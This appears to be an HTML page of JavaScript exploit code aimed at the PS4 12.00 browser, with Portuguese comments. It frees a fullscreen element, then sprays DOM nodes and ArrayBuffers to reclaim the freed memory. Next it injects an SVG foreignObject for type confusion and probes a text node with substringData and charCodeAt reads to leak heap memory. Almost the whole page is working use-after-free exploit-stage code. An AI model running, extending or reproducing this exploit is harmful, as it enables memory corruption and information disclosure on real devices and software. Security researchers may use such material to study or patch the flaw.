<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Memory Leak Stage</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Overread → Memory Leak</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (MIXED SIZES)
function reclaim(size){
    log("[*] Reclaim size = " + size);

    // churn
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    // DOM spray
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }

    // 🔥 ArrayBuffer spray MIXED
    let ab=[];
    for(let i=0;i<4000;i++){
        ab.push(new Uint8Array(new ArrayBuffer(0x20)));
        ab.push(new Uint8Array(new ArrayBuffer(0x40)));
        ab.push(new Uint8Array(new ArrayBuffer(0x80)));
    }
}

// ==========================
// 💥 SVG CONFUSION
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">
                    AAAA
                </div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 OVERREAD + DUMP
function leakProbe(fsTarget){
    log("---- LEAK PROBE ----");

    try{
        let n = fsTarget.firstChild;

        log("[CHECK] nodeType = " + n.nodeType);

        if(n && n.nodeType === 3){

            log("[!!!] TEXTNODE CONFUSION");

            // 💣 write grande (expande buffer)
            try{
                n.data = "A".repeat(0x200);
                log("[PWN] expand write OK");
            }catch(e){
                log("[UAF] expand write crash");
            }

            // ==========================
            // 🔥 substring overread
            try{
                let big = n.substringData(0, 0x1000);
                log("[LEAK+] substring len = " + big.length);
                log("[LEAK+] preview = " + big.slice(0,50));
            }catch(e){
                log("[LEAK+] substring crash");
            }

            // ==========================
            // 🔥 charCode dump
            try{
                let dump = [];
                for(let i=0;i<128;i++){
                    let c = n.data.charCodeAt(i);
                    dump.push(c);
                }
                log("[LEAK] charCodes = " + dump.join(","));

                // heurística
                let suspicious = dump.some(v => v !== 65 && v !== 0);
                if(suspicious){
                    log("[!!!] POSSIVEL LEAK DE MEMORIA");
                }

            }catch(e){
                log("[LEAK] charCode crash");
            }

            // ==========================
            // 🔥 leitura incremental (scan)
            try{
                let found = false;

                for(let i=0;i<256;i++){
                    let c = n.data.charCodeAt(i);

                    if(c !== 65 && c !== 0){
                        log("[SCAN] offset " + i + " = " + c);
                        found = true;
                        break;
                    }
                }

                if(!found){
                    log("[SCAN] nenhum byte estranho");
                }

            }catch(e){
                log("[SCAN] crash");
            }

        }

    }catch(e){
        log("[UAF] probe crash geral");
    }
}

// ==========================
// TRIGGER (INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1500,2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    // 🔬 probes múltiplos
    setTimeout(()=>leakProbe(fsTarget), 80);
    setTimeout(()=>leakProbe(fsTarget), 160);
    setTimeout(()=>leakProbe(fsTarget), 240);

    // dump final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ CRÍTICO
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste");

    let heap=setupHeap();
    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
